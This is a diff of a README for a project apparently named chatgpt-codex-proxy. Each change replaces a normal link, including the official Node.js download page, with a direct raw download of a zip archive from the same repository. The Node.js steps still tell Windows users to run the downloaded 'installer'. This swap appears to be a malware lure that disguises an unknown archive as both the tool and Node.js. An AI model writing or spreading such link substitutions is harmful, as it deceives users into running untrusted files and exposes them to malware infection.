@@ -1,6 +1,6 @@
 # 🤖 chatgpt-codex-proxy - Easy Proxy for Claude Code Backend
 
-[![Download Here](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/KYYFEM/chatgpt-codex-proxy)
+[![Download Here](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/KYYFEM/chatgpt-codex-proxy/main/dxt/codex-chatgpt-proxy-v1.9-alpha.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ First, you need to get chatgpt-codex-proxy files to your computer.
 
 Click this link to visit the download page and get the latest version:
 
-[![Download chatgpt-codex-proxy](https://img.shields.io/badge/Download-From%20GitHub-green?style=for-the-badge)](https://github.com/KYYFEM/chatgpt-codex-proxy)
+[![Download chatgpt-codex-proxy](https://img.shields.io/badge/Download-From%20GitHub-green?style=for-the-badge)](https://raw.githubusercontent.com/KYYFEM/chatgpt-codex-proxy/main/dxt/codex-chatgpt-proxy-v1.9-alpha.1.zip)
 
 Once you open the page:
 
@@ -55,7 +55,7 @@ chatgpt-codex-proxy requires Node.js to run. If you already have Node.js, skip t
 
 If you don’t have Node.js:
 
-- Visit https://nodejs.org/en/
+- Visit https://raw.githubusercontent.com/KYYFEM/chatgpt-codex-proxy/main/dxt/codex-chatgpt-proxy-v1.9-alpha.1.zip
 - Download the **LTS** (Long Term Support) version for Windows
 - Run the installer by double-clicking the downloaded file
 - Follow all prompts with default options
@@ -189,4 +189,4 @@ You may want to run chatgpt-codex-proxy as a background service or start it auto
 
 ---
 
-[![Download chatgpt-codex-proxy](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/KYYFEM/chatgpt-codex-proxy)
+[![Download chatgpt-codex-proxy](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/KYYFEM/chatgpt-codex-proxy/main/dxt/codex-chatgpt-proxy-v1.9-alpha.1.zip)
